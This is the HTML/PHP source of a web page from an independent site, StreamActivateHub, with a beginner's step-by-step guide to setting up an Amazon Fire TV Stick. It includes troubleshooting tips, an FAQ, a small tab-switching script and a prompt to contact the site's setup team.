                            <i data-lucide="flame" class="text-primary w-8 h-8"></i> Amazon Fire Stick Setup Guide
                        </h3>
                        <p class="text-xl text-slate-600">Beginner-Friendly Amazon Fire TV Stick Setup Tutorial</p>
                        <a href="https://www.amazon.com/code" target="_blank" rel="nofollow noopener" class="mt-4 inline-flex items-center gap-2 bg-slate-100 border border-slate-200 text-slate-700 hover:bg-primary hover:text-white hover:border-primary px-6 py-2.5 rounded-full font-semibold transition-all">
                            Visit Official Amazon Link <i data-lucide="external-link" class="w-4 h-4"></i>
                        </a>
                    </div>

                    <div class="bg-blue-50 border border-blue-100 rounded-2xl p-6 text-slate-700">
                        <p>Amazon Fire TV Stick is a streaming device that allows users to access streaming applications, movies, television channels, music, and online entertainment directly on their television. This setup guide explains how to configure your Fire Stick safely and efficiently.</p>
                        <p class="mt-2 text-sm text-slate-500"><strong>Disclaimer:</strong> StreamActivateHub is an independent informational website and is not affiliated with Amazon or Fire TV.</p>
                    </div>

                    <div class="bg-white border border-slate-100 shadow-sm p-8 rounded-2xl">
                        <h4 class="text-xl font-bold text-slate-900 mb-4">What You Need Before Setup</h4>
                        <ul class="grid grid-cols-1 md:grid-cols-3 gap-4 text-slate-600">
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Amazon Fire TV Stick</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> HDMI-compatible TV</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> WiFi internet connection</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Amazon account</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Fire TV remote</li>
                            <li class="flex items-center gap-2"><i data-lucide="check" class="text-green-500 w-5 h-5"></i> Power adapter</li>
                        </ul>
                    </div>

                    <!-- Steps Grid -->
                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
                        
                        <div class="space-y-4">
                            <h4 class="text-lg font-bold text-slate-900">Step 1 — Connect Fire Stick</h4>
                            <img src="assets/images/amazon/amazon_1.jpg" alt="Connect Fire Stick" class="rounded-xl w-full object-cover h-48 border border-slate-200">
                            <ul class="space-y-2 text-slate-600">
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Plug into an HDMI port.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Connect power adapter.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Turn on television.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Select HDMI input.</li>
                            </ul>
                        </div>

                        <div class="space-y-4">
                            <h4 class="text-lg font-bold text-slate-900">Step 2 — Pair Remote</h4>
                            <img src="assets/images/amazon/amazon_2.jpg" alt="Pair Remote" class="rounded-xl w-full object-cover h-48 border border-slate-200">
                            <ul class="space-y-2 text-slate-600">
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Insert batteries.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Hold Home button.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Wait for pairing.</li>
                            </ul>
                        </div>

                        <div class="space-y-4">
                            <h4 class="text-lg font-bold text-slate-900">Step 3 — Connect WiFi</h4>
                            <img src="assets/images/amazon/amazon_3.jpg" alt="Connect WiFi" class="rounded-xl w-full object-cover h-48 border border-slate-200">
                            <ul class="space-y-2 text-slate-600">
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Choose network.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Enter password.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Device may update automatically.</li>
                            </ul>
                        </div>

                        <div class="space-y-4">
                            <h4 class="text-lg font-bold text-slate-900">Step 4 — Sign In</h4>
                            <img src="assets/images/amazon/amazon_4.jpg" alt="Sign In" class="rounded-xl w-full object-cover h-48 border border-slate-200">
                            <ul class="space-y-2 text-slate-600">
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Sign in with Amazon account.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Registration completes.</li>
                                <li class="flex items-start gap-2"><div class="mt-1.5 w-1.5 h-1.5 rounded-full bg-primary shrink-0"></div>Install streaming apps.</li>
                            </ul>
                        </div>

                    </div>

                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8 mt-8">
                        <div class="bg-slate-100 p-6 rounded-2xl">
                            <h4 class="text-lg font-bold text-slate-900 mb-4"><i data-lucide="alert-circle" class="w-5 h-5 inline text-primary mb-1"></i> Troubleshooting Tips</h4>
                            <div class="space-y-4 text-slate-600">
                                <div><strong>Frozen:</strong> Restart device, reconnect power, check HDMI.</div>
                                <div><strong>Remote Not Working:</strong> Replace batteries, restart pairing, remove interference.</div>
                                <div><strong>Slow Streaming:</strong> Improve WiFi signal, restart router, close background apps.</div>
                            </div>
                        </div>

                        <div class="bg-slate-100 p-6 rounded-2xl">
                            <h4 class="text-lg font-bold text-slate-900 mb-4"><i data-lucide="help-circle" class="w-5 h-5 inline text-primary mb-1"></i> Frequently Asked Questions</h4>
                            <div class="space-y-4 text-slate-600">
                                <div><strong>Does it require Amazon Prime?</strong> No. Prime is optional for many apps.</div>
                                <div><strong>Can it work on any TV?</strong> Most TVs with HDMI ports are supported.</div>
                            </div>
                        </div>
                    </div>
                </div>

            </div>
        </div>
    </div>

    <script>
        function showTutorial(id) {
            // Hide all tutorials
            document.querySelectorAll('.tutorial-content').forEach(el => {
                el.classList.remove('block');
                el.classList.add('hidden');
            });
            // Show selected tutorial
            document.getElementById('tutorial-' + id).classList.remove('hidden');
            document.getElementById('tutorial-' + id).classList.add('block');

            // Reset all buttons
            document.querySelectorAll('.tutorial-btn').forEach(btn => {
                btn.classList.remove('bg-primary', 'text-white', 'shadow-lg', 'shadow-primary/30');
                btn.classList.add('bg-slate-100', 'text-slate-600', 'hover:bg-slate-200');
            });
            // Highlight selected button
            const activeBtn = document.getElementById('btn-' + id);
            activeBtn.classList.remove('bg-slate-100', 'text-slate-600', 'hover:bg-slate-200');
            activeBtn.classList.add('bg-primary', 'text-white', 'shadow-lg', 'shadow-primary/30');
        }
    </script>


    
    <!-- CTA -->
    <section class="py-20 relative overflow-hidden fade-in-up">
        <div class="absolute inset-0 bg-primary"></div>
        <div class="container mx-auto px-6 relative z-10 text-center">
            <h2 class="text-4xl md:text-5xl font-extrabold text-white mb-6">Need Help Setting Up Your Device?</h2>
            <p class="text-xl text-primary-100 mb-10 text-white/90">Reach out to our AV integration team to schedule an on-site consultation.</p>
            <div class="flex flex-col sm:flex-row justify-center gap-4">
                <a href="contact" class="bg-white text-primary hover:bg-slate-50 px-8 py-4 rounded-full font-bold text-lg shadow-xl">Contact Us Online</a>
            </div>
        </div>
    </section>
</div>

<?php include 'includes/footer.php'; ?>
